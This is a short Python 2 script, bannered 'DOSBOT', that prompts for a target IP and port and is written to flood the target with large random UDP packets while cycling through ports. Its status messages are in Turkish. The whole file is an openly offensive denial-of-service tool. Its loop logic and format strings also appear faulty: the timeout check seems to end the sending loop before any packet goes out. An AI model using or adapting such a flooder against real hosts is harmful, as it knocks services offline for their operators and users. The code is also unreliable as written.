import sys;
import os;
import time;
import socket;
import random;
from datetime import datetime;
now = datetime.now();
hour = now.hour;
minute = now.minute;
day = now.day;
month = now.month;
year = now.year;
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = random._urandom(10000);
timeout = time.time();
os.system ("clear");

print ("""
\033[1;36;40m
 ______   _______  _______  _______  _______  _______ 
|      | |       ||       ||  _    ||       ||       |
|  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
| | |   ||  | |  || |_____ |       ||  | |  |  |   |  
| |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
|       ||       | _____| || |_|   ||       |  |   |  
|______| |_______||_______||_______||_______|  |___|  
""")
ip = raw_input("\033[1;33;40mIP: ");
port = input("\033[1;33;40mPort: ");

os.system("clear");
sent = 0;
while True:
     while 1:
       if time.time() > timeout:
         break;
       else:
         pass;
         sock.sendto(bytes, (ip, port));
         sent = sent + 1;
         port = port + 1;
         print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent,ip,port);
         if port == 65534:
           port = 1;
